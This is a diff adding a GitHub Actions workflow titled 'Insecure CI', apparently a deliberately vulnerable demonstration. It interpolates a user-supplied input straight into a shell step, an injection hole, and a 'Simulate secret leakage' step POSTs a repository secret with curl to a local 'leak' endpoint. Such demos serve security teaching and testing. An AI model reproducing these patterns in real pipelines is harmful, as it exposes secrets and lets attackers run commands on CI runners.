@@ -1,0 +1,24 @@
+name: Insecure CI
+
+on:
+  workflow_dispatch:
+    inputs:
+      username:
+        description: "Username"
+        required: true
+        default: "normaluser"
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Show input
+        run: |
+          echo "Received input: ${{ github.event.inputs.username }}"
+
+      - name: Simulate secret leakage
+        env:
+          MY_SECRET: ${{ secrets.MY_SECRET }}
+        run: |
+          echo "Sending secret to attacker..."
+          curl -X POST http://localhost:8000/leak -d "secret=$MY_SECRET"
